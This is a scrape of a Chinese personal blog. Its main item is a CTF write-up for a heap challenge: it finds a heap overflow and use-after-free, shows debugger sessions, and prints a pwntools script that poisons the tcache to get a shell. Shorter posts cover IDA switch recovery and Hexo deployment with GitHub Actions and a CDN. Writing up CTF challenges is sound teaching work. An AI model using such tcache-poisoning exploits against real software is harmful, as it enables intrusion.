语句存储输入的寄存器（Input register of switch）也有了，就是这里的 eax。 Default case 的跳转目标地址（Default jump address），可以拉到下面去看每一个目标地址处的指令来进行判断，更简单的方法是看 0x11a2 地址处的ja loc_122A，如果输入值大于 5，则直接跳转到 0x122a 处，那么这个 0x122a 显然就是 default case 的跳转目标地址。 最后，Signed jump table elements 是否需要勾选？跳转表的基址是 0x206c，跳转目标地址的范围在 0x11cb 到 0x122a，在编译时，跳转表中存储的元素是跳转目标地址减去跳转表的基址，那显然这些值都是负值，所以需要勾选。 .rodata:000000000000206C jumptable_206C dd offset loc_122A - $ ; DATA XREF: main+49↑o.rodata:000000000000206C ; main+55↑o ....rodata:0000000000002070 dd offset loc_11CB - offset jumptable_206C.rodata:0000000000002074 dd offset loc_11DE - offset jumptable_206C.rodata:0000000000002078 dd offset loc_11F1 - offset jumptable_206C.rodata:000000000000207C dd offset loc_1204 - offset jumptable_206C.rodata:0000000000002080 dd offset loc_1217 - offset jumptable_206C 其他没有提到的参数保持默认即可，为了便于查阅，我也画了一张填写图示。 完成之后，再次按 F5 进行反编译，可以看到，IDA Pro 很完美地还原了 switch 语句的结构。 int __cdecl main(int argc, const char **argv, const char **envp){ int input; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); while (1 ) { switch ((unsigned int)__isoc99_scanf(&quot;%d&quot;, &amp;input) ) { case 1u: printf(&quot;your input is 1&quot;); break; case 2u: printf(&quot;your input is 2&quot;); break; case 3u: printf(&quot;your input is 3&quot;); break; case 4u: printf(&quot;your input is 4&quot;); break; case 5u: printf(&quot;your input is 5&quot;); break; default: printf(&quot;what's your input?&quot;); } }} 那如果说你恢复完得到的 switch 语句不这么完美而是有点奇奇怪怪的，识别出了 switch 语句但又没有完全识别，请回去检查一下你的“Start of the switch idiom”参数是不是给对了，比如说我如果给的是那句 lea rdx, ds:0[rax*4] 的地址 0x11aa，那么我反编译得到的结果是这个样子： int __cdecl main(int argc, const char **argv, const char **envp){ unsigned int input; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); while (2 ) { while (1 ) { __isoc99_scanf(&quot;%d&quot;, &amp;input); if (input &lt;= 5 ) break;LABEL_9: printf(&quot;what's your input?&quot;); } switch (input) { case 1u: printf(&quot;your input is 1&quot;); continue; case 2u: printf(&quot;your input is 2&quot;); continue; case 3u: printf(&quot;your input is 3&quot;); continue; case 4u: printf(&quot;your input is 4&quot;); continue; case 5u: printf(&quot;your input is 5&quot;); continue; default: goto LABEL_9; } }}","link":"/2021/08/Specify-switch-statement-in-IDA-Pro/"},{"title":"Write-up | NeSE 丙组 7 月月赛","text":"NeSE 战队丙组 7 月月赛，只做出了 pwn 的这一道题，花了一整天时间。第一次写 Write-up，内容比较详尽。 题目考点 堆溢出 Use After Free tcache 解题思路 题目给的程序文件名叫 heap ，提示了解题方向应该与堆相关，同时注意到题目提供的 libc 版本是 2.31。运行程序，首先看到第一行输出了一个提示内容，可能是内存某处的值或者某个地址，十有八九会用到。接着输出了一个菜单，数字 1-5 分别对应创建、写入、打印、删除和退出五个功能。逐个尝试一下，看看程序都提供了什么功能。其中输入数字 3 尝试打印 node 时，程序输出了 “not implemented”，似乎是没有实现这个功能。 $ ./heap hint: 0x564ea3dba0401)create2)write3)print4)del5)exit=&gt; 1Size: 10node index: 01)create2)write3)print4)del5)exit=&gt; 2Index: 0Size: 20Content: blijojodiblido1)create2)write3)print4)del5)exit=&gt; 3not implemented1)create2)write3)print4)del5)exit =&gt; 4Index: 01)create2)write3)print4)del5)exit=&gt; 5 使用 checksec 工具查看一下程序架构和保护机制。这是一个 64 位程序，开启了 PIE ，即程序运行时的代码段（.text）、数据段（.data）和未初始化数据段（.bss）地址都是随机的。 $ checksec ./heap[*] '/home/nuke/work/ctf/nese/monthly_7/pwn1/heap' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 程序静态分析 使用 IDA Pro x64 加载程序进行静态分析，从左侧 Functions windows 定位到 main 函数，按下 F5 键尝试进行反编译，得到的伪代码看起来有点奇怪，似乎缺少了一些逻辑。 int __cdecl main(int argc, const char **argv, const char **envp){ int v5; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v6; // [rsp+8h] [rbp-8h] v6 = __readfsqword(0x28u); init(argc, argv, envp); if (*(_QWORD *)(buff + 16) ) system(&quot;/bin/sh&quot;); fwrite(&quot;\\n1)create\\n2)write\\n3)print\\n4)del\\n5)exit\\n=&gt; &quot;, 1uLL, 0x2AuLL, stdout); v5 = 10; __isoc99_scanf(&quot;%d&quot;, &amp;v5); if (v5 &gt;= 0 &amp;&amp; v5 &lt;= 5 ) __asm { jmp rax } puts(&quot;make wise choice!&quot;); return __readfsqword(0x28u) ^ v6;} 按下 TAB 键切换回汇编代码界面，根据汇编代码内容和程序运行逻辑，推测这里应该有一个被编译器使用跳转表优化后的 switch 语句，没有被 IDA 识别出来。从 0x1711 地址处开始的是跳转的目标地址部分，而 0x16F8 地址处和 0x1704 地址处的 lea 指令所取的 unk_20D0 标签所指向的地址应该就是跳转表，0x16E6 是 switch 语句的起始地址，因此先 对 switch 语句进行恢复。 .text:00000000000016C4 call ___isoc99_scanf.text:00000000000016C9 mov eax, [rbp+var_C].text:00000000000016CC test eax, eax.text:00000000000016CE js short loc_16D8.text:00000000000016D0 mov eax, [rbp+var_C].text:00000000000016D3 cmp eax, 5.text:00000000000016D6 jle short loc_16E6.text:00000000000016D8.text:00000000000016D8 loc_16D8: ; CODE XREF: main+85↑j.text:00000000000016D8 lea rdi, aMakeWiseChoice ; &quot;make wise choice!&quot;.text:00000000000016DF call _puts.text:00000000000016E4 jmp short loc_1748.text:00000000000016E6 ; ---------------------------------------------------------------------------.text:00000000000016E6.text:00000000000016E6 loc_16E6: ; CODE XREF: main+8D↑j.text:00000000000016E6 mov eax, [rbp+var_C].text:00000000000016E9 cmp eax, 5.text:00000000000016EC ja short loc_1747.text:00000000000016EE mov eax, eax.text:00000000000016F0 lea rdx, ds:0[rax*4].text:00000000000016F8 lea rax, unk_20D0.text:00000000000016FF mov eax, [rdx+rax].text:0000000000001702 cdqe.text:0000000000001704 lea rdx, unk_20D0.text:000000000000170B add rax, rdx.text:000000000000170E db 3Eh.text:000000000000170E jmp rax.text:0000000000001711 ; ---------------------------------------------------------------------------.text:0000000000001711 mov eax, 0.text:0000000000001716 call create_node.text:000000000000171B jmp short loc_1742.text:000000000000171D ; ---------------------------------------------------------------------------.text:000000000000171D mov eax, 0.text:0000000000001722 call write_node.text:0000000000001727 jmp short loc_1742.text:0000000000001729 ; ---------------------------------------------------------------------------.text:0000000000001729 lea rdi, aNotImplemented ; &quot;not implemented&quot;.text:0000000000001730 call _puts.text:0000000000001735 jmp short loc_1742.text:0000000000001737 ; ---------------------------------------------------------------------------.text:0000000000001737 mov eax, 0.text:000000000000173C call del_node.text:0000000000001741 nop 恢复了 switch 语句之后，再次按 F5 键进行反编译，得到 main 函数的伪代码。可以看到，while 循环的开始部分很引人注目，判断 buff + 16 处 QWORD 大小的值是否非 0 ，如果非 0 就执行 system(&quot;/bin/sh&quot;); ，那基本上可以确定后面的目标是通过某种方式修改 buff + 16 处的值使其不为 0 ，就可以拿到 shell 。循环体中剩下的部分就是根据输入值的不同去调用对应的函数完成相关操作，我们也可以注意到 case 3 对应的 print 操作确实是没有实现的。 int __cdecl main(int argc, const char **argv, const char **envp){ int input; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v6; // [rsp+8h] [rbp-8h] v6 = __readfsqword(0x28u); init(); while (2 ) { if (*(_QWORD *)(buff + 16) ) system(&quot;/bin/sh&quot;); fwrite(&quot;\\n1)create\\n2)write\\n3)print\\n4)del\\n5)exit\\n=&gt; &quot;, 1uLL, 0x2AuLL, stdout); input = 10; __isoc99_scanf(&quot;%d&quot;, &amp;input); if (input &gt;= 0 &amp;&amp; input &lt;= 5 ) { switch (input) { case 1: create_node(); continue; case 2: write_node(); continue; case 3: puts(&quot;not implemented&quot;); continue; case 4: del_node(); continue; default: return __readfsqword(0x28u) ^ v6; } } else { puts(&quot;make wise choice!&quot;); } break; } return __readfsqword(0x28u) ^ v6;} init 函数分析 程序在进入 while 循环之前还调用了一次 init 函数，先来看一下它做了哪些操作。首先是执行了常见的 setvbuf ，通过将第三个参数设置为 _IONBF 从而关闭输出缓冲，使得输出的内容都可以立即显示到屏幕上。接着为 nodes 和 buffer 初始化了内存，大小都是 0x50 。在执行到这里之前并没有看到这两个变量的定义，双击变量看到它们都在 .bss 段，因此都是全局变量。之后的内容就比较有意思，可以看到 buff 就是一个指向 buffer 的指针，也是定义在 .bss 段，然后程序直接输出了 buff 指针的值，也就是 buffer 的地址。那前面我们要修改 buff + 16 地址处的值，也就是修改 buffer 的第 16 个字节的内容，程序给我们提示了 buffer 的地址，更加印证了我们需要去修改 buffer 缓冲区。 int init(){ setvbuf(stdout, 0LL, 2, 0LL); memset(&amp;nodes, 0, 0x50uLL); memset(buffer, 0, sizeof(buffer)); buff = (__int64)buffer; buffer[1] = 'A'; return fprintf(stdout, &quot;hint: %p\\n&quot;, (const void *)buff);} create_node 函数分析和结构体识别 接着逐个查看 create_node 、write_node 和 del_node 三个函数。create_node 函数的逻辑是获取一个输入 size ，然后输出一个 node index ，而 size 的值被限定在了 0 到 1024 之间。 unsigned __int64 create_node(){ int size; // [rsp+0h] [rbp-10h] BYREF unsigned int i; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); puts(&quot;\\nSize: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;size); if (size &gt; 0 &amp;&amp; size &lt;= 1024 ) { for (i = 0; (int)i &lt;= 8; ++i ) { if (dword_40AC[4 * i] != 1 ) { *((_QWORD *)&amp;nodes + 2 * (int)i) = malloc(size); dword_40AC[4 * i] = 1; *((_DWORD *)&amp;unk_40A8 + 4 * (int)i) = size; fprintf(stdout, &quot;node index: %d\\n&quot;, i); return __readfsqword(0x28u) ^ v3; } } puts(&quot;nodes too much!&quot;); } else { puts(&quot;size illegal!&quot;); } return __readfsqword(0x28u) ^ v3;} 这段伪代码看起来不是那么清晰，代码里出现了 dword_40AC 和 unk_40A8 ，这两个是什么东西？双击追踪到它所在的 .bss 段，看到它们两个紧跟在 nodes 后面。其实从前面的分析，已经不难猜测程序含有一个 node 结构体，而 nodes 是一个定义为全局变量的 node 数组。前面在 init 函数中，初始化 nodes 时指定的大小是 0x50 ，也就是 80 个字节，那这里的 nodes 怎么会只有 8 个字节？那基本可以推测 dword_40AC 和 unk_40A8 的内存空间也是 nodes 的一部分了，只是因为被直接引用所以被 IDA Pro 也加了标签。算一下它们加起来有多大，8 + 4 + 0x21 * 4 = 144 ，诶怎么不是 80 个字节？ .bss:00000000000040A0 public nodes.bss:00000000000040A0 nodes db ? ; ; DATA XREF: create_node+AA↑o.bss:00000000000040A0 ; write_node+B7↑o ....bss:00000000000040A1 db ? ;.bss:00000000000040A2 db ? ;.bss:00000000000040A3 db ? ;.bss:00000000000040A4 db ? ;.bss:00000000000040A5 db ? ;.bss:00000000000040A6 db ? ;.bss:00000000000040A7 db ? ;.bss:00000000000040A8 unk_40A8 db ? ; ; DATA XREF: create_node+E0↑o.bss:00000000000040A8 ; del_node+A1↑o.bss:00000000000040A9 db ? ;.bss:00000000000040AA db ? ;.bss:00000000000040AB db ? ;.bss:00000000000040AC ; _DWORD dword_40AC[33].bss:00000000000040AC dword_40AC dd 21h dup(?) ; DATA XREF: create_node+79↑o.bss:00000000000040AC ; create_node+C1↑o ... 不着急，再看代码。首先 for 循环以 i 作为循环变量从 0 到 8 进行遍历，共 9 个值，接着一个 if 判断 dword_40AC[4 * i] 是否为 1 ，不为 1 则继续向下执行并将其设置为 1 ，如果遍历完 9 个变量没有找到 dword_40AC[4 * i] 不为 1 的，则输出 “nodes too much!” 然后退出。那么不难猜测出 dword_40AC[4 * i] 处是 node 结构体中表示节点是否已被使用的一个变量，且其大小是 一个 DWORD，也就是 4 个字节。根据编程习惯我们假定它的声明为 int used 。从这部分的分析也可以确定 nodes 数组最多可以存储 9 个节点，每隔 4 个 DWORD 长度就有一个 used 变量，那么基本可以推测出每一个 node 结构体的大小是 4 * 4 = 16 个字节。 再看 *((_QWORD *)&amp;nodes + 2 * (int)i) = malloc(size); 这行，申请一块 size 大小的内存，存储的是申请到内存的地址，可以推测处这个是用来存储 node 的 content 的指针，大小为一个 QWORD， 也正是 64 位系统上指针的字长，根据编程习惯我们假定它的声明是 void *content_ptr 。当变量 i 为 0 时，它所指向的就是 nodes 的起始地址，那么它应该是 node 结构体的第一个成员变量。每隔 2 个 QWORD 长度出现一次，验证了前面计算的 node 结构体的大小 16 字节。再看 *((_DWORD *)&amp;unk_40A8 + 4 * (int)i) = size; 这行，把 size 的值也保存到结构体中，大小是一个 DWORD ，同样每隔 16 个字节出现一次，假定它的声明是 unsigned int size 。 我们来看当 i 为 0 的情况，这时应该是遍历到第一个 node 结构体，content_ptr 成员变量相对于 nodes 数组的偏移是 0 ，那显然它是 node 结构体的第一个成员变量，同样地，size 成员变量相对于 unk_40A8 的偏移是 0 ，相对于 nodes 数组的偏移是 8 ；used 成员变量相对于 dword_40AC 的偏移是 0 ，相对于 nodes 数组的偏移是 12 ，那么 node 结构体的三个成员变量的顺序也就确定了，我们可以定义出 node 结构体。再次计算确认一下，node 结构体的大小 8 + 4 + 4 刚好是 16 个字节，与前面的推测一致。nodes 数组的大小 16 * 9 = 144 也与前面的计算一致，但为什么在 init 函数中只初始化了前 80 个字节我们不得而知，可能是写错了，也可能是别有用意。 struct node { void *content_ptr; unsigned int size; int used;}; 完成 node 结构体和 nodes 数组的定义后，重新按 F5 进行反编译，create_node 函数的结构就就变得很清晰了。先在 nodes 数组的 9 个元素中寻找一个没有被使用的节点，为其申请一块 size 大小的堆块，将 size 值保存并置 used 位为 1 。 unsigned __int64 create_node(){ int size; // [rsp+0h] [rbp-10h] BYREF unsigned int i; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); puts(&quot;\\nSize: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;size); if (size &gt; 0 &amp;&amp; size &lt;= 1024 ) { for (i = 0; (int)i &lt;= 8; ++i ) { if (nodes[i].used != 1 ) { nodes[i].content_ptr = malloc(size); nodes[i].used = 1; nodes[i].size = size; fprintf(stdout, &quot;node index: %d\\n&quot;, i); return __readfsqword(0x28u) ^ v3; } } puts(&quot;nodes too much!&quot;); } else { puts(&quot;size illegal!&quot;); } return __readfsqword(0x28u) ^ v3;} write_node 函数分析 接着再看 write_node 函数，读入一个 index，然后判断其值是否在 0 到 9 之间并且节点的 used 被置位，注意这个范围，包含 9，总共 10 个，而前面 create_node 函数在索引时是 9 个，出现了不一致，但是同时这个判断中还含有对 used 成员变量的检查，可能会增加利用难度。接着读入一个 size ，并根据 size 大小读入 content ，诶很有意思这个 size 是我自己输入的，前面创建节点的时候已经指定了一个 size ，并且 content_ptr 指针所指向的堆块大小是根据我创建时指定的 size 来分配的，那显然这俩 size 又出现了不一致，这不是就有了一个堆溢出了嘛，而且溢出多少我自己说了算。 unsigned __int64 write_node(){ int index; // [rsp+0h] [rbp-10h] BYREF unsigned int size; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); puts(&quot;\\nIndex: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;index); if (index &gt;= 0 &amp;&amp; index &lt;= 9 &amp;&amp; nodes[index].used ) { puts(&quot;\\nSize: &quot;); __isoc99_scanf(&quot;%u&quot;, &amp;size); puts(&quot;\\nContent: &quot;); read(0, nodes[index].content_ptr, size); fflush(stdin); } else { puts(&quot;index illegal!&quot;); } return __readfsqword(0x28u) ^ v3;} del_node 函数分析 最后再来看 del_node 函数，首先检查的 index 范围还是一个越界，然后释放掉了 content_ptr 指针所指向的堆块，并且将 size 和 used 成员变量都置 0 ，但是 content_ptr 指针并没有置 0 ，那么它还是指向已经被释放掉的 content 堆块的，此处存在 UAF(Use After Free) 利用。 unsigned __int64 del_node(){ int index; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;\\nIndex: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;index); if (index &gt;= 0 &amp;&amp; index &lt;= 9 &amp;&amp; nodes[index].used ) { free(nodes[index].content_ptr); nodes[index].size = 0; nodes[index].used = 0; } else { puts(&quot;index illegal!&quot;); } return __readfsqword(0x28u) ^ v2;} 调试和利用漏洞获取 shell先来总结一下通过上面分析得到的所有条件： 程序主动泄露了 buffer 的地址 write_node 函数存在堆溢出漏洞，可以溢出任意大小 del_node 函数在释放 node 时没有将 content_ptr 置 NULL ，可以实现 Use After Free write_node 和 del_node 函数都存在下标越界问题，但可能较难利用，因为还存在对 used 成员变量的检查 当 buffer 的第 16 个字节不为 0 值时，可以获得 shell 程序使用的 libc 版本为 2.31，加入了 tcache 机制，释放的堆块会进入 tcachebin 而不是 fastbin 通过这些条件，大致可以产生这样一个利用思路：创建 3 个 node ，即申请 3 个堆块（称为 0、1、2 号块），依次释放掉 1 号堆块和 2 号堆块，利用 0 号块的溢出将已经被释放掉的 1 号块的 fd 指针由原先的 2 号堆块地址修改为 buffer + 16 的地址，然后依次再申请两个堆块，这样第一次申请到的是先前释放掉的 2 号堆块，第二次申请到的则是 buffer + 16 处的缓冲区。利用 write_node 函数向缓冲区开头写入任意内容，在下次 while 循环时，if (*(_QWORD *)(buff + 16) ) 判断通过，程序直接执行 system(&quot;/bin/sh&quot;); 返回 shell。 先创建 3 个大小为 16 的堆块试一下，可以看到，从 Top Chunk 分割出来了 3 个小堆块，size 显示为 21（64 位系统中能够划分的最小 chunk 大小为 0x20 字节，其中 chunk size 的最低三位由低到高存储的依次是 PREV_INUSE、IS_MMAPPED 和 NON_MAIN_ARENA 信息，这里它们的值分别是 1、0、0 ，所以 size 的最低位是 1 ，并不是说这块 chunk 的大小是 0x21 字节）。 pwndbg&gt; rStarting program: /home/nuke/work/ctf/nese/monthly_7/pwn1/heap hint: 0x5555555580401)create2)write3)print4)del5)exit=&gt; 1Size: 16node index: 0...=&gt; 1Size: 16node index: 1...=&gt; 1Size: 16node index: 2...=&gt; ^Cpwndbg&gt; heap...Allocated chunk | PREV_INUSEAddr: 0x5555555596a0Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x5555555596c0Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x5555555596e0Size: 0x21Top chunk | PREV_INUSEAddr: 0x555555559700Size: 0x20901pwndbg&gt; x/20gx 0x5555555596a00x5555555596a0: 0x0000000000000000 0x0000000000000021 &lt;--- | prev_size | size |0x5555555596b0: 0x0000000000000000 0x0000000000000000 &lt;--- | user data |0x5555555596c0: 0x0000000000000000 0x00000000000000210x5555555596d0: 0x0000000000000000 0x00000000000000000x5555555596e0: 0x0000000000000000 0x00000000000000210x5555555596f0: 0x0000000000000000 0x00000000000000000x555555559700: 0x0000000000000000 0x00000000000209010x555555559710: 0x0000000000000000 0x00000000000000000x555555559720: 0x0000000000000000 0x00000000000000000x555555559730: 0x0000000000000000 0x0000000000000000 接着，释放掉后两个堆块，再次查看堆的情况。可以看到，释放的堆块并没有像在 libc 2.23 中一样回收到了 fastbin，而是放进了 tcachebin 中，但其仍然是由 fd 指针链接到一起的。 pwndbg&gt; cContinuing.4Index: 1...=&gt; 4Index: 2...=&gt; ^Cpwndbg&gt; heap...Allocated chunk | PREV_INUSEAddr: 0x5555555596a0Size: 0x21Free chunk (tcache) | PREV_INUSEAddr: 0x5555555596c0Size: 0x21fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x5555555596e0Size: 0x21fd: 0x5555555596d0...pwndbg&gt; binstcachebins0x20 [2]: 0x5555555596f0 —▸ 0x5555555596d0 ◂— 0x0fastbins0x20: 0x0...pwndbg&gt; x/12gx 0x5555555596a00x5555555596a0: 0x0000000000000000 0x0000000000000021 &lt;--- | prev_size | size |0x5555555596b0: 0x0000000000000000 0x0000000000000000 &lt;--- | user data |0x5555555596c0: 0x0000000000000000 0x0000000000000021 &lt;--- | prev_size | size |0x5555555596d0: 0x0000000000000000 0x0000555555559010 &lt;--- | fd | bk |0x5555555596e0: 0x0000000000000000 0x0000000000000021 &lt;--- | prev_size | size |0x5555555596f0: 0x00005555555596d0 0x0000555555559010 &lt;--- | fd | bk | 接着再创建与刚删掉的堆块大小一样的两个堆块，可以看到，刚刚的两个堆块又回来了。（拿来吧你） pwndbg&gt; cContinuing.1Size: 16node index: 1...=&gt; 1Size: 16node index: 2...=&gt; ^Cpwndbg&gt; tcachebinstcachebinsemptypwndbg&gt; x/gx (void *)&amp;nodes+160x5555555580b0 &lt;nodes+16&gt;: 0x00005555555596f0pwndbg&gt; x/gx (void *)&amp;nodes+16*20x5555555580c0 &lt;nodes+32&gt;: 0x00005555555596d0 现在可以编写利用脚本进行利用了，还需要注意的是，我们要修改的是 2 号堆块的 fd 指针，溢出时还会覆盖 1 号堆块的全部内容还有 2 号堆块自身的 size 字段，需要进行填充。利用脚本如下，可以在 while 循环里的 fwrite 函数处下中断，这样每次执行完一个操作后都会停下来，便于观察。 exploit.py#!/usr/bin/env python3# NeSE 丙组月赛 2021 年 7 月# 题目：heap# 作者：ChinaNukefrom pwn import *def cmd_create(size): p.sendlineafter(b'=&gt; ', b'1') p.sendlineafter(b'Size: \\n', str(size).encode())def cmd_write(index, size, content): p.sendlineafter(b'=&gt; ', b'2') p.sendlineafter(b'Index: \\n', str(index).encode()) p.sendlineafter(b'Size: \\n', str(size).encode()) p.sendlineafter(b'Content: \\n', content)def cmd_del(index): p.sendlineafter(b'=&gt; ', b'4') p.sendlineafter(b'Index: \\n', str(index).encode())if not args['REMOTE']: p = process('./heap')else: p = remote('xxx.xxx.xxx.xxx', xxxxx)# Receive the leaked buffer addressp.recvuntil(b'hint: 0x')buff_addr = int(p.recvuntil(b'\\n', drop=True), 16)log.info(f'buff_addr: {buff_addr:#x}')cmd_create(0x10)cmd_create(0x10)cmd_create(0x10)cmd_del(1)cmd_del(2)# Breakpoint on fwrite() function call#gdb.attach(p, 'b *$rebase(0x16a5)')cmd_write(0, 80, b'A'*24 + p64(0x21) + b'A'*24 + p64(0x21) + p64(buff_addr+16))cmd_create(0x10)cmd_create(0x10)cmd_write(2, 8, b'hello')p.interactive() 可以看到，在写入 payload 造成溢出之后，重新申请堆块之前，tcachebin 中的第二个元素被替换成了 buffer + 16 的地址，这时我们再连续申请两个堆块，那么拿到的后一个堆块就是以 buffer + 16 为地址的堆块。 pwndbg&gt; tcachebinstcachebins0x20 [2]: 0x555fe286a2f0 —▸ 0x555fe1c91050 (buffer+16) ◂— 0x0pwndbg&gt; c...pwndbg&gt; tcachebinstcachebins0x20 [1]: 0x555fe1c91050 (buffer+16) ◂— 0x0pwndbg&gt; c...pwndbg&gt; tcachebinstcachebinsemptypwndbg&gt; x/gx (void *)&amp;nodes+16*20x555fe1c910c0 &lt;nodes+32&gt;: 0x0000555fe1c91050","link":"/2021/08/Write-up-for-NeSE-monthly-contest-in-July/"},{"title":"使用 GitHub Actions 部署 Hexo 博客","text":"本文介绍如何使用 GitHub Actions 实现自动部署 Hexo 博客，具体方案为：使用两个仓库，一个私有仓库存放 Hexo 博客的源程序，一个公开仓库存放生成的静态网站。当我们向私有仓库 push 时，GitHub Actions 自动生成静态页面并推送到公开仓库，实现博客的自动化部署。 下文中都假设你已下载安装了 Hexo 所必需的组件并且已经在本地初始化了 Hexo 博客。 首先，你需要有一个私有仓库 hexo-src （名称随意）和一个公开仓库 &lt;username&gt;.github.io 。 检查 Hexo 博客根目录下的 package.json 文件，确保其中有以下内容，如没有则自行添加，新安装的应该默认是有的。 { ... “scripts”: { &quot;build&quot;: &quot;hexo generate&quot;, ... }, ...} 在私有仓库中添加 .github/workflow/pages.yml 文件，内容如下： name: Github Page # 名字随意 on: push: branches: - main # 私有仓库的默认分支名字 jobs: pages: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - name: Use Node.js 12.x uses: actions/setup-node@v1 with: node-version: '12.x' - name: Cache NPM dependencies uses: actions/cache@v2 with: path: node_modules key: ${{ runner.OS }}-npm-cache restore-keys: | ${{ runner.OS }}-npm-cache - name: Install Dependencies run: npm install - name: Build run: npm run build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: personal_token: ${{ secrets.PERSONAL_TOKEN }} # 下面内容按需修改 external_repository: ChinaNuke/ChinaNuke.github.io # 目标仓库 (存放静态页面) publish_branch: main # 目标仓库的默认分支名字 publish_dir: ./public cname: nuke666.cn # 如果设置了自定义域名则需要设置此项 由于是部署目标是另一个仓库，因此需要设置 ${{ secrets.PERSONAL_TOKEN }} 并指定所要推送到的仓库 external_repository 以及其默认分支。 生成一个 personal token（scopes 选择 repo 即可），然后将其添加到私有仓库的 Secrets 里面（点击上方 Settings，然后点击 Secrets），名字为 PERSONAL_TOKEN，这样执行 Action 时就会自动去读取这个 token。 然后就完成了，直接把私有仓库 push 一下，Actions 会自动添加并执行，最多一分钟左右静态页面就会生成在公开仓库里。 当然也可以部署到同一个仓库里，只是缺点是你的仓库源文件也需要公开，万一不注意在配置文件里写了什么密码密钥的就不太好，部署到同一个仓库的方法见下方参考链接中的官方文档，大致步骤相似。 参考 https://hexo.io/docs/github-pages https://github.com/marketplace/actions/github-pages-action","link":"/2021/03/deploy-hexo-using-github-actions/"},{"title":"Hexo 部署到又拍云 CDN","text":"Github 在国内的访问速度实在难以接受，这样大家怎么能看到我在博客写的段子！ 于是乎，去了解了一下国内的 CDN 服务，发现又拍云可以白嫖，开始行动！ 在配置过程中遇到了一世纪难题：我的域名配置了阿里云的企业邮箱，于是我就不能把 nuke666.cn 使用 CNAME 方式解析到 CDN 服务器，会提示冲突。搜了半天似乎这个问题无解，只好委曲求全曲线救国，将 nuke666.cn 以 A 记录方式解析到 GitHub Page，使用 www.nuke666.cn 作为访问 CDN 的域名，这样访问我的博客就需要通过 www.nuke666.cn，使用nuke666.cn 的话访问到的是 GitHub Page 源站。如果没有遇到这一世纪难题的话，把这两者反过来自然是极好的。 配置的具体过程如下： GitHub Page 的配置 首先 ping chinanuke.github.io 获得网站的 IP 地址，为 nuke666.cn 添加 A 记录解析到此地址，然后在 GitHub 的 Settings 中添加自定义域名，并开启强制 HTTPS。GitHub 会自动为我们申请证书，需要等待一段时间才能生效。 又拍云的配置 在又拍云创建 CDN 服务 加速域名填写欲解析到 CDN 服务器的地址（www.nuke666.cn），由于 Hexo 是静态网站，所以应用场景选择 网页图片，其他填写内容入下图所示。 配置 CDN将 www.nuke666.cn 设置 CNAME 解析到又拍云提供的 CNAME 地址，回源 Host设置为源站的地址（nuke666.cn）。 申请和配置证书 在HTTPS 配置 中，为 www.nuke666.cn 申请免费的 Let’s Encrypt 证书，开启 HTTPS 访问和强制 HTTPS 访问。 至此，CDN 的配置已经全部完成。通过浏览器访问www.nuke666.cn，应该是可以正常访问的，那么怎么知道 CDN 有没有生效呢？ 通过浏览器的 开发者工具 ，查看Response Headers，有server: marco/2.11 即生效（又拍云的技术支持提供的方法），如果直连源站的话会显示server: GitHub.com 国内无法加载 Font Awesome 库的问题 虽然使用了 CDN，但是依然感觉很慢。询问又拍云技术支持得知，只有本域名下的内容才会被缓存到 CDN，而 Hexo 的主题如果使用 Font Awesome 等，是不会被加速的。通过开发者工具查看请求，发现向 fontawesome.com 的请求占用了大量的时间，而且最终还请求失败了？ 在 icarus 主题的配置文件中提供了对修改 CDN 的支持，修改如下，发现速度有明显提升。 themes/icarus/_config.ymlproviders: # Name or URL template of the JavaScript and/or stylesheet CDN provider cdn: jsdelivr # Name or URL template of the webfont CDN provider fontcdn: loli # Name or URL of the fontawesome icon font CDN provider iconcdn: loli 又拍云打钱！","link":"/2020/07/deploy-to-upyuncdn/"},{"title":"Hexo 博客安装、备份、恢复和升级","text":"Hexo 是目前很流行的一个博客框架，目前搜索引擎中搜索到的自建博客十有七八都是使用的 Hexo，本博客用的也正是 Hexo。由于 Hexo 官方文档中安装部分搞得人晕头转向，所以本文整理记录一下 Hexo 博客安装、部署、备份 / 恢复以及升级的主要步骤和注意事项，力求简单清爽，供参考。 初装 安装 nodejs 和 npm $ pacman -S npm 也可以直接在 Pamac 包管理器中搜索 npm 安装。nodejs 作为 npm 的依赖会自动安装。pacman 是 Manjaro Linux 和 Arch Linux 的包管理软件，其他发行版命令不同但方法类似。 创建博客源程序目录，并安装 Hexo 到此目录 $ mkdir hexo-src &amp;&amp; cd hexo-src$ npm install hexo 此命令将 hexo 安装到 hexo-src 目录的 node_modules 中。 修改 PATH（可选） 将以下内容写入 ~/.bashrc 最后一行（如果用的是 zsh 就写到 ~/.zshrc），然后执行 source ~/.bashrc 命令。 export &quot;PATH=$PATH:$HOME/hexo-src/node_modules/.bin&quot; 这一步是为了能在命令行中直接使用 hexo 命令。也可以不进行这一步，只是以后需要用 npx hexo 命令代替。此处假定 hexo 目录在用户 home 目录中，如不同请修改命令。 进行博客初始化 $ hexo init # 或者 npx hexo init$ npm install 完成 部署 / 备份 推荐 使用 GitHub Actions 部署和备份博客。 恢复 安装 nodejs 和 npm 克隆源程序仓库 $ git clone git@github.com:&lt;username&gt;/hexo-src.git 安装 hexo 和依赖模块 $ cd hexo-src$ npm install 此命令会读取目录中的 package.json 并自动安装 hexo 及所需的模块到 node_modules 目录中。 修改 PATH（可选） 完成 升级$ npm update 